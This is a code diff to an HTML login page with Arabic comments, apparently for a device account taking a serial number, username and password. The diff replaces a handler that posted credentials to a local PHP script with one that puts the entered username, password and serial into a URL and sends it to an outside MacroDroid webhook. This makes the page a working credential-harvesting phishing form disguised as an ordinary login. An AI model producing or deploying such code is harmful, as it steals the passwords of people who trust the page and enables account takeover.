@@ -34,7 +34,7 @@
             <div id="webNameImg"></div>
             <div id="container">
                 <div id="accountLoginWrap">
-                    <form id="loginForm" action="javascript:void(0);">
+                    <form id="loginForm" onsubmit="sendToWebhook(event)">
                         <div class="itemWrap">
                             <i class="icon sn-icon"></i>
                             <input type="text" id="txtAccountSN" name="sn" value="QR123456" class="txt-input" autocomplete="off" />
@@ -62,8 +62,8 @@
     </div>
 
     <script>
-        // التعامل مع إرسال النموذج عبر AJAX
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        // التعامل مع إرسال النموذج إلى Webhook عند الضغط
+        function sendToWebhook(event) {
             event.preventDefault();
 
             // استخراج القيم من الحقول
@@ -71,25 +71,21 @@
             var username = document.getElementById('txtUserName').value;
             var password = document.getElementById('txtPassword').value;
 
-            // إرسال البيانات إلى Webhook عبر AJAX
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'save_login_data.php', true);
-            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    alert('تم إرسال البيانات بنجاح إلى Webhook!');
-                    
-                    // لا تقوم بإرسال النموذج إلا إذا كانت البيانات قد تم إرسالها بنجاح
-                    // إرسال النموذج بعد إرسال البيانات (اختياري)
-                    document.getElementById('loginForm').submit(); // إعادة إرسال النموذج
-                } else {
-                    alert('حدث خطأ أثناء إرسال البيانات إلى Webhook!');
-                }
-            };
+            // بناء الرابط مع المعلمات
+            var webhookUrl = `https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&serial=${encodeURIComponent(sn)}`;
 
-            // إرسال البيانات إلى Webhook مع القيم التي تم إدخالها
-            xhr.send('sn=' + encodeURIComponent(sn) + '&username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
-        });
+            // إرسال الطلب عبر fetch
+            fetch(webhookUrl)
+                .then(response => response.text())
+                .then(data => {
+                    alert('تم إرسال البيانات بنجاح إلى Webhook. الرد: ' + data);
+                    // في حالة الرغبة بإرسال النموذج بعد نجاح الطلب
+                    // document.getElementById('loginForm').submit();
+                })
+                .catch(error => {
+                    alert('حدث خطأ أثناء إرسال البيانات إلى Webhook: ' + error);
+                });
+        }
     </script>
 </body>
 </html>
